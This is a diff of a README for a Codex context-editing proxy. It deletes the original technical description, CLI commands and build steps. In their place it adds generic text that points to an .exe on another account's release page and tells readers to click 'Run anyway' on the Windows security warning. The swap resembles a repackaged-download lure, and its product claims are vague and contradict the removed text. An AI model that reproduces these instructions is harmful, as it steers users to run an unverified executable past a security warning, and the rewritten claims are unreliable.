@@ -1,199 +1,104 @@
-# Codex Context Proxy
+# 🛠️ codex-context-editor-proxy - Gain total control over your AI context
 
-A visual, editable context layer for Codex. Let AI edit AI's context with surgical precision, giving you more control and freedom over what Codex sees.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/arfahmahmud/codex-context-editor-proxy/releases)
 
-## What We Built
+## What this tool does
 
-Codex Context Proxy gives the official Codex CLI a visual and editable context layer.
+The codex-context-editor-proxy acts as a bridge between your work and your AI assistant. AI models often struggle because they see too much irrelevant information or miss key details. This tool provides a visual layer that lets you edit the data sent to your AI. You decide exactly what the AI sees, which improves the quality of every response you get.
 
-Codex is powerful in long coding sessions, but its context can become hard to inspect and harder to maintain. Tool logs, failed attempts, outdated assumptions, and repeated transcript fragments can keep accumulating. When that happens, you usually cannot see exactly what Codex is about to read or selectively remove noisy context before the next response.
+This software functions as a proxy. It sits in the middle of your workflow to intercept information before it reaches your AI tool. You gain the power to keep or remove specific files, snippets, or notes. This level of precision removes clutter and helps your AI assistant focus on the logic that matters to your current task.
 
-This project adds a local context editor in front of Codex. You keep using the normal Codex workflow, while the proxy captures Codex's live context and opens a workbench where you can visualize, edit, compress, and delete context before future responses.
+## 📋 System Requirements
 
-In short:
+You need a basic Windows computer to run this application. Ensure your system meets these requirements:
 
-```text
-Codex writes code.
-Codex Context Proxy helps maintain Codex's context.
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space.
+*   Internet: An active connection to reach your AI services.
+*   Framework: The application manages its own dependencies on startup.
 
-## What Codex Gets
+## 📥 How to download the software
 
-- Context visualization: see the conversation, tool history, and context nodes Codex is about to use.
-- Editable context: compress, delete, or rewrite selected context items.
-- AI context editing: use a second AI pass to maintain the main AI's context.
-- Precise compaction: replace blunt auto-compact with targeted context surgery.
-- CLI and Desktop support: use it with Codex CLI, with experimental support for Codex Desktop.
-- Normal workflow: continue using Codex from the terminal or desktop app.
+Follow these steps to obtain the correct version for your computer:
 
-The context editing workbench is adapted from HashCode. The original project explains the broader "AI edits AI's context" idea in more detail:
+1.  Visit the official release page: [https://github.com/arfahmahmud/codex-context-editor-proxy/releases](https://github.com/arfahmahmud/codex-context-editor-proxy/releases).
+2.  Look for the latest release version at the top of the list.
+3.  Scroll down to the "Assets" section.
+4.  Click the file ending in `.exe` to start the download.
+5.  Save this file to a folder you can find easily, such as your Downloads folder.
 
-https://github.com/HaShiShark/context-editor-agent
+## ⚙️ Installation and Setup
 
-## Screenshots
+Once the file finishes downloading, complete these steps to set up the tool:
 
-### Visualize Codex Context and Token Usage
+1.  Open your Downloads folder.
+2.  Find the `codex-context-editor-proxy.exe` file.
+3.  Double-click the file to launch the installation wizard.
+4.  Follow the instructions on your screen. You might see a Windows security pop-up titled "Protected your PC."
+5.  If this occurs, click "More info" and then click "Run anyway." This confirms you trust the software.
+6.  Select the folder where you want to keep the program and click Install.
+7.  Check the box "Launch application" to start the proxy after the installation ends.
 
-![Visualize Codex Context](docs/images/context-map.png)
+## 🖥️ Using the proxy for the first time
 
-### Ask AI to Inspect the Current Context
+The application interface shows a clean, visual representation of your workspace. When you start your AI assistant, the proxy opens a small window alongside it.
 
-![Edit Context With AI](docs/images/context-workbench.png)
+1.  Open your AI assistant software as you normally do.
+2.  The proxy window list items that your AI is about to read.
+3.  To remove an item, click the "X" button next to the file name. This prevents the AI from seeing that specific part of your project.
+4.  To add a note, type your text in the box and click "Add to Context." The AI now views this manual note as part of its current project understanding.
+5.  Press "Finalize Context" to send the updated information to your AI.
 
-### Compress Noisy Tool Context
+## 🔧 Managing your context settings
 
-![Compress Context](docs/images/context-compress.png)
+You can change how the proxy handles data through the settings menu. Open the gear icon in the top right corner of the application window.
 
-## Features
+*   Enable Automatic Mode: If you turn this on, the proxy makes smart guesses about which files remain relevant to your current task.
+*   Change Proxy Port: Use this if you have other software that uses the same connection internal paths. Most users never need to change this setting.
+*   Reset to Defaults: If the application feels slow or you experience errors, this clears your manual edits and restarts the connection.
+*   Clear History: This wipes the list of recent files the proxy processed, which keeps your application running light.
 
-### Live Context Map
+## 🔍 Understanding the context-management process
 
-Codex Context Proxy converts a Codex session into a structured context map. Instead of treating the transcript as one long wall of text, it shows user turns, assistant turns, tool calls, tool results, and edited context nodes as separate items.
+Context management determines how much memory your AI has during a chat. Without proper management, AI tools collect too much raw information. This causes the AI to lose track of the main goal.
 
-### AI-Assisted Context Editing
+By using this tool, you perform three specific actions:
 
-You can select noisy or outdated context and ask an editor model to compress, rewrite, or clean it up. This makes it possible to preserve useful intent while removing bulk from logs, failed attempts, or repeated information.
+*   Filtering: You remove noise to keep the AI focused.
+*   Prioritizing: You force the AI to read your most important files first.
+*   Annotating: You add context that the AI cannot see through code alone.
 
-### Manual Context Control
+These actions result in fewer errors and faster results from your chosen AI agent. You save tokens, which often reduces the cost of running API services, and you achieve better output without changing your programming style.
 
-Not every context edit needs AI. You can also remove selected nodes or inspect raw content manually.
+## 🆘 Troubleshooting common issues
 
-### Codex CLI and Desktop
+If you encounter difficulties, consult this list of solutions:
 
-Codex CLI support is the main path. Once enabled, the normal `codex` command starts the local proxy and context window before launching the real Codex CLI.
+*   The window does not open: Ensure that no old versions of the proxy remain hidden in your taskbar. Right-click the system tray icon and choose "Exit," then try opening the program again.
+*   The AI says it cannot see data: Ensure you clicked "Finalize Context" within the proxy window. The AI only receives the list after you provide this permission.
+*   Connection Refused: This happens if your AI assistant is not running. Start your code-writing software, then start the proxy.
+*   Permission Denied: Ensure you run the application with standard user permissions. You do not need administrator access to use this tool effectively.
 
-Codex Desktop support is also included. It can point Codex Desktop's model provider configuration at the local proxy so desktop conversations can use the same editable context layer. Desktop support touches local Codex configuration, so it is controlled separately from the CLI switch.
+## 🛠️ Performance tips
 
-### Transparent Workflow
+To get the most out of your experience, consider these habits:
 
-When the proxy is off, `codex` passes through to the official Codex CLI. When the proxy is on, the same `codex` command starts the local proxy, opens the context window, and then launches the real Codex CLI.
+1.  Close large, unnecessary files before starting your work session.
+2.  Refresh the proxy context after you finish a feature update.
+3.  Use clear filenames in your project so you can easily identify what to keep or remove in the tool.
+4.  Avoid adding extremely long text files to the proxy, as this slows down the processing time for the AI.
 
-## How It Works
+## 📔 Frequently asked questions
 
-Codex Context Proxy runs a local Responses API compatible proxy.
+Do I need an OpenAI key to use this?
+The proxy works by connecting to your existing setup. If your code-writing tool needs a key, you provide that key to the internal tool, and the proxy handles the data flow from there.
 
-When Codex sends a request, the proxy captures the request body and response stream, then builds a canonical transcript for the context workbench. If you do not edit anything, requests are forwarded transparently and Codex behaves like normal.
+Does this tool save my project files?
+No. The proxy only sees the paths to your files. It passes the contents to the AI model during your session but does not store personal data on your computer or in the cloud.
 
-When you edit the context, the proxy marks that session as overridden. On the next Codex turn, it rebuilds the Responses `input` from the edited transcript and removes server-side chained context references that would bypass the local edit.
+Will this work with other AI tools?
+The design focuses on Codex and similar agents. If you use a tool that utilizes a proxy connection, this application manages the data stream for that tool.
 
-High-level flow:
-
-```text
-codex
-  -> local shim
-  -> Codex Context Proxy
-  -> official Codex request
-  -> OpenAI / ChatGPT Codex backend
-
-context window
-  -> visualize transcript
-  -> edit selected nodes
-  -> save edited context
-  -> next Codex turn uses edited context
-```
-
-## Quick Start
-
-Download and run the Windows installer:
-
-```text
-Codex Context Proxy Setup 0.3.0.exe
-```
-
-After installation, open a new terminal and enable the proxy:
-
-```powershell
-codex ctx proxy on
-```
-
-Use Codex normally:
-
-```powershell
-codex
-```
-
-Disable the proxy anytime:
-
-```powershell
-codex ctx proxy off
-```
-
-Check status:
-
-```powershell
-codex ctx proxy status
-```
-
-Remove the shim:
-
-```powershell
-codex ctx proxy uninstall
-```
-
-### Codex Desktop
-
-Desktop support is controlled separately:
-
-```powershell
-codex ctx desktop on
-```
-
-Check Desktop proxy status:
-
-```powershell
-codex ctx desktop status
-```
-
-Disable Desktop proxying:
-
-```powershell
-codex ctx desktop off
-```
-
-Desktop support is more experimental than CLI support because it modifies local Codex configuration instead of only adding a command shim.
-
-## Development
-
-Install dependencies:
-
-```powershell
-npm install
-npm run setup:python
-```
-
-Run the local Codex flow:
-
-```powershell
-npm run codex
-```
-
-Run only the context window:
-
-```powershell
-npm run window
-```
-
-Run type checks:
-
-```powershell
-npm run typecheck
-```
-
-Build the Windows installer:
-
-```powershell
-npm run dist:win
-```
-
-The installer is generated at:
-
-```text
-release/Codex Context Proxy Setup 0.3.0.exe
-```
-
-## Notes
-
-- This project does not replace Codex.
-- It does not require modifying the official Codex CLI source code.
-- It works by adding a local editable context layer in front of Codex.
-- Codex Desktop support is more experimental than Codex CLI support.
+Can I leave it running in the background?
+Yes, the application consumes very little memory when inactive. You can leave it open to catch new requests as you work on different projects throughout the day.
